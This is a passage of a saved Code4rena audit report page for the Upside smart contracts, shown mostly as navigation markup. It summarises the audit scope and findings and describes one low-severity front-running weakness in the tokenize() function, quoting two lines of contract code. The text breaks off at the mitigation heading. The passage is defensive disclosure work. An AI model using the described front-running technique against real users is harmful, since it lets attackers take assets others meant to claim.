7H9.625C9.08896 7 8.38425 6.7029 8.11306 6.07141Z"></path></g></g></svg><p class="core-app--link--label">Reports</p></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Docs (opens in new window)" target="_blank" rel="noreferrer noopener" href="https://docs.code4rena.com/"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M11 5.5C7.68629 5.5 5 8.18629 5 11.5C5 14.8137 7.68629 17.5 11 17.5C14.3137 17.5 17 14.8137 17 11.5C17 8.18629 14.3137 5.5 11 5.5ZM3 11.5C3 7.08172 6.58172 3.5 11 3.5C15.4183 3.5 19 7.08172 19 11.5C19 15.9183 15.4183 19.5 11 19.5C6.58172 19.5 3 15.9183 3 11.5Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M11 10.5C11.5523 10.5 12 10.9477 12 11.5V14.7C12 15.2523 11.5523 15.7 11 15.7C10.4477 15.7 10 15.2523 10 14.7V11.5C10 10.9477 10.4477 10.5 11 10.5Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M10 8.29974C10 7.74746 10.4477 7.29974 11 7.29974H11.01C11.5623 7.29974 12.01 7.74746 12.01 8.29974C12.01 8.85203 11.5623 9.29974 11.01 9.29974H11C10.4477 9.29974 10 8.85203 10 8.29974Z"></path></g></g></svg><p class="core-app--link--label">Docs</p><svg class="core-app--link--external" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M13.6778 4.8C13.1807 4.8 12.7778 4.39706 12.7778 3.9C12.7778 3.40294 13.1807 3 13.6778 3H18.5667C19.0637 3 19.4667 3.40294 19.4667 3.9V8.78889C19.4667 9.28595 19.0637 9.68889 18.5667 9.68889C18.0696 9.68889 17.6667 9.28595 17.6667 8.78889V6.07279L10.2401 13.4994C9.88861 13.8508 9.31876 13.8508 8.96729 13.4994C8.61582 13.1479 8.61582 12.578 8.96729 12.2266L16.3939 4.8H13.6778ZM5.52961 7.24448C5.3361 7.24448 5.15052 7.32135 5.01369 7.45818C4.87685 7.59501 4.79998 7.7806 4.79998 7.97411V16.9371C4.79998 17.1306 4.87685 17.3162 5.01369 17.453C5.15052 17.5898 5.3361 17.6667 5.52961 17.6667H14.4926C14.6861 17.6667 14.8717 17.5898 15.0085 17.453C15.1453 17.3162 15.2222 17.1306 15.2222 16.9371V12.0482C15.2222 11.5511 15.6251 11.1482 16.1222 11.1482C16.6193 11.1482 17.0222 11.5511 17.0222 12.0482V16.9371C17.0222 17.608 16.7557 18.2514 16.2813 18.7258C15.8069 19.2002 15.1635 19.4667 14.4926 19.4667H5.52961C4.85871 19.4667 4.21529 19.2002 3.74089 18.7258C3.2665 18.2514 2.99998 17.608 2.99998 16.9371V7.97411C2.99998 7.30321 3.2665 6.65979 3.74089 6.18539C4.21529 5.71099 4.85871 5.44448 5.52961 5.44448H10.4185C10.9156 5.44448 11.3185 5.84742 11.3185 6.34448C11.3185 6.84154 10.9156 7.24448 10.4185 7.24448H5.52961Z"></path></g></g></svg></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Support" href="https://code4rena.com/help"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M11.2349 4.8C7.68095 4.8 4.7999 7.68105 4.7999 11.235C4.7999 12.7888 5.34945 14.2118 6.26567 15.3238C6.51173 15.6225 6.53935 16.045 6.33426 16.3731L5.52372 17.67H11.2349C14.7889 17.67 17.6699 14.789 17.6699 11.235C17.6699 7.68105 14.7889 4.8 11.2349 4.8ZM2.9999 11.235C2.9999 6.68693 6.68684 3 11.2349 3C15.783 3 19.4699 6.68693 19.4699 11.235C19.4699 15.7831 15.783 19.47 11.2349 19.47H3.8999C3.57273 19.47 3.27133 19.2925 3.11272 19.0063C2.95412 18.7201 2.9633 18.3704 3.1367 18.093L4.47913 15.9451C3.54708 14.6104 2.9999 12.9857 2.9999 11.235Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M11.1412 8.81802C10.8498 8.76805 10.5502 8.8228 10.2954 8.97256C10.0406 9.12232 9.84699 9.35744 9.7489 9.63627C9.58396 10.1052 9.07013 10.3516 8.60124 10.1866C8.13235 10.0217 7.88596 9.50784 8.0509 9.03895C8.29005 8.35912 8.76208 7.78587 9.38339 7.42072C10.0047 7.05557 10.7352 6.92209 11.4455 7.04393C12.1558 7.16576 12.8 7.53505 13.2641 8.08637C13.7281 8.63754 13.9821 9.3351 13.9812 10.0555C13.9808 11.2501 13.0967 12.0226 12.5046 12.4174C12.1811 12.633 11.864 12.7909 11.6313 12.8944C11.5137 12.9466 11.4144 12.9864 11.3424 13.0138C11.3064 13.0276 11.2769 13.0383 11.2552 13.046L11.2286 13.0553L11.2198 13.0583L11.2166 13.0594L11.2153 13.0599L11.2286 13.0553L11.2142 13.0602C10.7426 13.2174 10.2329 12.9626 10.0758 12.491C9.91858 12.0195 10.1734 11.5098 10.645 11.3526L10.6434 11.3531L10.6522 11.35C10.6621 11.3465 10.6789 11.3404 10.7016 11.3318C10.7473 11.3143 10.8161 11.2869 10.9002 11.2495C11.071 11.1736 11.2918 11.0626 11.5061 10.9197C11.9897 10.5973 12.1812 10.2942 12.1812 10.0548L12.1812 10.0535C12.1816 9.75789 12.0774 9.4717 11.8871 9.24557C11.6967 9.01945 11.4325 8.86799 11.1412 8.81802Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M10.0869 15.075C10.0869 14.578 10.4899 14.175 10.9869 14.175H10.9969C11.494 14.175 11.8969 14.578 11.8969 15.075C11.8969 15.5721 11.494 15.975 10.9969 15.975H10.9869C10.4899 15.975 10.0869 15.5721 10.0869 15.075Z"></path></g></g></svg><p class="core-app--link--label">Support</p></a></li></ul></section></div><div id="core-app--nav--tooltip" role="tooltip" class="core-app--nav--tooltip"></div><div class="core-app--nav--footer"><button class="core-app--settings--submenu-trigger" aria-describedby="core-app--nav--tooltip" aria-label="User Options" type="button"><div class="avatar-c4 img-fill--cover " style="border-radius: 4px; width: 24px; height: 24px;"><img alt="Avatar for enthu2218" loading="lazy" decoding="async" data-nimg="fill" sizes="40px" srcset="/_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=16&amp;q=75 16w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=32&amp;q=75 32w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=48&amp;q=75 48w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=64&amp;q=75 64w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=96&amp;q=75 96w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=128&amp;q=75 128w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=256&amp;q=75 256w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=384&amp;q=75 384w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=3840&amp;q=75 3840w" src="./Upside_files/enthu2218.png" style="position: absolute; height: 100%; width: 100%; inset: 0px; color: transparent;"></div><strong class="username">enthu2218</strong><svg class="chevron-up" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M10.2636 6.2636C10.6151 5.91213 11.1849 5.91213 11.5364 6.2636L17.0364 11.7636C17.3879 12.1151 17.3879 12.6849 17.0364 13.0364C16.6849 13.3879 16.1151 13.3879 15.7636 13.0364L10.9 8.17279L6.0364 13.0364C5.68492 13.3879 5.11508 13.3879 4.7636 13.0364C4.41213 12.6849 4.41213 12.1151 4.7636 11.7636L10.2636 6.2636Z"></path></g></g></svg></button></div></nav><button type="button" aria-controls="core_app_nav" aria-expanded="true" aria-label="Collapse sidebar" class="core-app--nav--collapsible"><svg class="toggle-menu" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M10.5363 5.2636C10.8878 5.61508 10.8878 6.18492 10.5363 6.5364L6.1727 10.9L10.5363 15.2636C10.8878 15.6151 10.8878 16.1849 10.5363 16.5364C10.1848 16.8879 9.61498 16.8879 9.26351 16.5364L4.26351 11.5364C3.91204 11.1849 3.91204 10.6151 4.26351 10.2636L9.26351 5.2636C9.61498 4.91213 10.1848 4.91213 10.5363 5.2636ZM17.5363 5.2636C17.8878 5.61508 17.8878 6.18492 17.5363 6.5364L13.1727 10.9L17.5363 15.2636C17.8878 15.6151 17.8878 16.1849 17.5363 16.5364C17.1848 16.8879 16.615 16.8879 16.2635 16.5364L11.2635 11.5364C10.912 11.1849 10.912 10.6151 11.2635 10.2636L16.2635 5.2636C16.615 4.91213 17.1848 4.91213 17.5363 5.2636Z"></path></g></svg></button></div><main class="core-app--main sidebar--open"><div class="core-app-report"><header class="core-app--header no-print"><div class="core-app--header--left"><a class="core-app--header--redirect" href="https://code4rena.com/reports"><svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M13.0364 5.2636C13.3878 5.61508 13.3878 6.18492 13.0364 6.5364L8.17276 11.4L13.0364 16.2636C13.3878 16.6151 13.3878 17.1849 13.0364 17.5364C12.6849 17.8879 12.115 17.8879 11.7636 17.5364L6.26357 12.0364C5.9121 11.6849 5.9121 11.1151 6.26357 10.7636L11.7636 5.2636C12.115 4.91213 12.6849 4.91213 13.0364 5.2636Z"></path></g></svg><strong>Reports</strong></a><div class="core-app--header--filters"></div></div></header><a class="core-app-report__back-button limited-width" href="https://code4rena.com/reports">Reports</a><section class="core-app-report__top limited-width"><div class="core-app-report__top-content"><div class="core-app-report__project"><div class="core-app-report__project--top"><div class="core-app-report__project-link project-link"><a href="https://x.com/UpsideFun" class="logo-64"><img alt="Upside" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="70px" srcset="/_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=16&amp;q=75 16w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=32&amp;q=75 32w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=48&amp;q=75 48w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=64&amp;q=75 64w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=96&amp;q=75 96w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=128&amp;q=75 128w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=256&amp;q=75 256w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=384&amp;q=75 384w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yqsfiw92mZH&amp;w=3840&amp;q=75 3840w" src="./Upside_files/upload-Yqsfiw92mZH.jpeg"></a></div><div class="core-app-report__details"><h1 class="type__headline__xs">Upside<!-- --> Findings &amp; Analysis Report</h1></div></div></div></div><ul class="core-app-report__details-grid"><div class="core-app-report__details-wrapper"><li class="core-app-report__published"><span class="core-app-report__grid-value">PUBLISHED <!-- -->Jun 08, 2025</span></li></div></ul></section><div class=" core-app-report__md-wrapper limited-width type__copy"><div class="core-app-report__container"><div class="core-app-report__contents markdown-body"><h1 style="position:relative;" id="overview"><a class="anchor before" aria-label="overview permalink" href="https://code4rena.com/reports/2025-05-upside#overview"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Overview</h1>
<h2 style="position:relative;" id="about-c4"><a class="anchor before" aria-label="about c4 permalink" href="https://code4rena.com/reports/2025-05-upside#about-c4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>About C4</h2>
<p>Code4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.</p>
<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>
<p>During the audit outlined in this document, C4 conducted an analysis of the Upside smart contract system. The audit took place from May 19 to May 26, 2025.</p>
<p>Final report assembled by Code4rena.</p>
<h1 style="position:relative;" id="summary"><a class="anchor before" aria-label="summary permalink" href="https://code4rena.com/reports/2025-05-upside#summary"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Summary</h1>
<p>The C4 analysis yielded an aggregated total of 0 High and Medium vulnerabilities. Additionally, C4 analysis included 27 reports detailing issues with a risk rating of LOW severity or non-critical. </p>
<p>All of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Upside team.</p>
<h1 style="position:relative;" id="scope"><a class="anchor before" aria-label="scope permalink" href="https://code4rena.com/reports/2025-05-upside#scope"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Scope</h1>
<p>The code under review can be found within the <a href="https://github.com/code-423n4/2025-05-upside">C4 Upside repository</a>, and is composed of 2 smart contracts written in the Solidity programming language and includes 379 lines of Solidity code.</p>
<h1 style="position:relative;" id="severity-criteria"><a class="anchor before" aria-label="severity criteria permalink" href="https://code4rena.com/reports/2025-05-upside#severity-criteria"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Severity Criteria</h1>
<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>
<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>
<ul>
<li>Malicious Input Handling</li>
<li>Escalation of privileges</li>
<li>Arithmetic</li>
<li>Gas use</li>
</ul>
<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href="https://code4rena.com/">the C4 website</a>, specifically our section on <a href="https://docs.code4rena.com/awarding/judging-criteria/severity-categorization">Severity Categorization</a>.</p>
<h1 style="position:relative;" id="low-risk-and-non-critical-issues"><a class="anchor before" aria-label="low risk and non critical issues permalink" href="https://code4rena.com/reports/2025-05-upside#low-risk-and-non-critical-issues"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Low Risk and Non-Critical Issues</h1>
<p>For this audit, 27 reports were submitted by wardens detailing low risk and non-critical issues. The <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-609">report highlighted below</a> by <strong>Brene</strong> received the top score from the judge.</p>
<p><em>The following wardens also submitted reports: <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-238">0xcb90f054</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-373">0xhp9</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-117">0xozovehe</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-594">Anyasaa</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-502">befree3x</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-680">c0pp3rscr3w3r</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-420">CasinoCompiler</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-226">dobrevaleri</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-396">dystopia</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-251">eLSeR17</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-115">farismaulana</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-287">harry</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-465">hgrano</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-648">Jamil</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-171">K42</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-618">MrPotatoMagic</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-243">peppef</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-517">PolarizedLight</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-434">rayss</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-423">ret2basic</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-436">Roger</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-454">SafetyBytes</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-547">sakibcy</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-203">Sakursf</a>, <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-353">Tigerfrake</a>, and <a href="https://code4rena.com/audits/2025-05-upside/submissions/S-407">vaminator</a>.</em></p>
<h2 style="position:relative;" id="01-front-running-attack-in-tokenize-function"><a class="anchor before" aria-label="01 front running attack in tokenize function permalink" href="https://code4rena.com/reports/2025-05-upside#01-front-running-attack-in-tokenize-function"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[01] Front-running attack in tokenize function</h2>
<p><a href="https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159">https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159</a></p>
<h3 style="position:relative;" id="finding-description"><a class="anchor before" aria-label="finding description permalink" href="https://code4rena.com/reports/2025-05-upside#finding-description"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>tokenize()</code> function in the <code>UpsideProtocol</code> contract allows users to tokenize the provided <code>url</code>. A critical parameter governing this process is <code>tokenizeFeeEnabled</code>, which determines whether users must pay a fee in order to call the function. When this flag is set to <code>false</code>, users can freely call <code>tokenize()</code> without paying any fee.</p>
<p>This design introduces a significant front-running risk. Since the function can be called without restriction or cost when fees are disabled, malicious actors can monitor pending transactions in the mempool and submit the same <code>tokenize()</code> call with a higher gas price to get their transaction mined first.
Once the second user successfully tokenizes the provided URL, the contract sets a mapping entry for that URL:</p>
<pre data-index="0" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">urlToMetaCoinMap</span><span class="mtk1">[</span><span class="mtk12">_url</span><span class="mtk1">] = </span><span class="mtk12">metaCoinAddress</span><span class="mtk1">;</span></span></span></code></pre>
<p>This causes <code>urlToMetaCoinMap[_ur]</code> to be non-zero. Therefore, when user1’s transaction is eventually mined, the following check fails:</p>
<pre data-index="1" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">urlToMetaCoinMap</span><span class="mtk1">[</span><span class="mtk12">_url</span><span class="mtk1">] != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">MetaCoinExists</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span></code></pre>
<h3 style="position:relative;" id="impact"><a class="anchor before" aria-label="impact permalink" href="https://code4rena.com/reports/2025-05-upside#impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Attackers can steal high-value URLs (e.g., popular brand names).</p>
<h3 style="position:relative;" id="recommended-mitigation-steps"><a class="anchor before" aria-label="recommended mitigation steps permalink" href="https://code4rena.com/reports/2025-05-upside#recommended-mitigation-steps"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
